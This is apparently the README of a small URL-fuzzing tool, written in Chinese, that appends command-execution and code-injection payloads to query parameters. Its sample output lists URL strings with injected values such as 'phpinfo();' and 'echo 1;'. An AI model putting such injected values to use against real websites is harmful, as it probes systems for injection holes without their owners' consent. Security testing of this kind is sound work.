# UrlPollution

>对URL进行Payload污染

* 命令执行
* 命令注入
```
python pollution.py
```

```
['a=1phpinfo%28%29%3B&b=2', 'a=1&b=2phpinfo%28%29%3B', 'a=1echo+1%3B&b=2', 'a=1&b=2echo+1%3B']
```
